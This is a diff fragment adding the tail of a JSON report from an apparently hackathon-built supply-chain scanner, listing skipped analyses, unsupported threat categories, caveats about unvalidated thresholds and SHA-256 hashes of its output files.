+  "notes": [
+   "requirements-dev.txt: transitive dependencies unknown (Docker daemon unavailable; sandboxed resolution skipped)",
+   "requirements.txt: transitive dependencies unknown (Docker daemon unavailable; sandboxed resolution skipped)",
+   "Syft and Trivy unavailable; SBOM built from native lockfile/manifest parsing only"
+  ],
+  "pipeline_errors": [],
+  "llm": "not configured (set GROQ_API_KEY to enable the LLM agents)",
+  "unsupported": [
+   "Malicious code inside a published package's contents (package tarballs are not unpacked or analysed on Day 1)",
+   "Runtime reachability of vulnerable functions (static references only)",
+   "Compromised maintainer accounts / registry account takeover",
+   "Native/binary artifact analysis",
+   "Call graphs and execution paths exist for Python only; other languages get file-level imports, routes, env reads and risky calls",
+   "Java/Kotlin import-to-Maven mapping is heuristic (groupId prefix); unused-dependency checks are skipped for Maven, NuGet and Composer",
+   "Ecosystems beyond npm, PyPI, Maven/Gradle, Go, Cargo, RubyGems, Composer and NuGet (e.g. Swift, CocoaPods, Conan) are inventoried by Syft/Trivy only",
+   "Container image layer contents unless Syft/Trivy can run"
+  ],
+  "thresholds": "Priority bands use unvalidated starting thresholds (hackathon Day 1); treat as triage order, not risk scores."
+ },
+ "remediation": null,
+ "validation": null,
+ "vex": null,
+ "integrity": {
+  "artifact_sha256": {
+   "facts.json": "bea3d75d424d9169c7738e1c68b1296fc3629301a3f7daa71d8dcdc60fa6f79c",
+   "sbom.cdx.json": "60b2132fdbb93c0208a36e83f9204471ca98e08c17bd13432baf4fea768d57f1",
+   "code_index.json": "2016040e097a20b192f6aa1d62771514fc9abca348e5a304a91c35f05f1a44e1",
+   "graph.json": "df0298f43242f2ddcd6a19656b678e35520a4273108d8bd9583a2b9f365e002e"
+  }
+ }
+}
